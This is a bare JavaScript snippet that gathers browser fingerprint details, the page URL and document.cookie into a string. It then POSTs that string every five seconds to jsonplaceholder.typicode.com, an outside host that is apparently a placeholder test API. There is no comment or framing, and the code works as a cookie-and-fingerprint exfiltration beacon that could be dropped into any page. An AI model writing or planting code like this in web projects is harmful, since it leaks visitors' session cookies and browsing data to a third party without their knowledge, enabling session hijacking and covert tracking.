txt = "<p>Browser CodeName: " + navigator.appCodeName + "</p>";
      txt += "<p>Browser Name: " + navigator.appName + "</p>";
      txt += "<p>Browser Version: " + navigator.appVersion + "</p>";
      txt += "<p>Cookies Enabled: " + navigator.cookieEnabled + "</p>";
      txt += "<p>Platform: " + navigator.platform + "</p>";
      txt += "<p>User-agent header: " + navigator.userAgent + "</p>";

      let userAgent = navigator.userAgent;
      let browserName;

      if (userAgent.match(/chrome|chromium|crios/i)) {
        browserName = "chrome";
      } else if (userAgent.match(/firefox|fxios/i)) {
        browserName = "firefox";
      } else if (userAgent.match(/safari/i)) {
        browserName = "safari";
      } else if (userAgent.match(/opr\//i)) {
        browserName = "opera";
      } else if (userAgent.match(/edg/i)) {
        browserName = "edge";
      } else {
        browserName = "No browser detection";
      }
      if (
        /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
          navigator.userAgent
        )
      ) {
        txt += "<p>Device: Mobile</p>";
      }
      else{
          txt+= "<p>Device: Desktop</p>"
      }
      navigator.sayswho= (function(){
    var ua= navigator.userAgent;
    var tem; 
    var M= ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
    if(/trident/i.test(M[1])){
        tem=  /\brv[ :]+(\d+)/g.exec(ua) || [];
        return 'IE '+(tem[1] || '');
    }
    if(M[1]=== 'Chrome'){
        tem= ua.match(/\b(OPR|Edge)\/(\d+)/);
        if(tem!= null) return tem.slice(1).join(' ').replace('OPR', 'Opera');
    }
    M= M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
    if((tem= ua.match(/version\/(\d+)/i))!= null) M.splice(1, 1, tem[1]);
    return M.join(' ');
})();
    txt += "<p>Version: " + navigator.sayswho + "</p>";
      txt += "<p>Browser: " + browserName.toUpperCase() + "</p>";
      txt += "<p>Location: " + document.location + "</p>";
      txt += "<p>Cookie: " + document.cookie + "</p>";
      var isOnline = navigator.onLine?'Online':'Offline';
      txt += "<p>Status: " + isOnline + "</p>";
      setInterval(() => {
        const todo = {
            title: txt
        };
          fetch('https://jsonplaceholder.typicode.com/todos', {
            method: 'POST',
            body: JSON.stringify(todo),
            headers: {
                'Content-type': 'application/json; charset=UTF-8'
            }
        })
        .then(response => response.json())
        .then(json => {
            console.log(json);
        });
      }, 5000);

      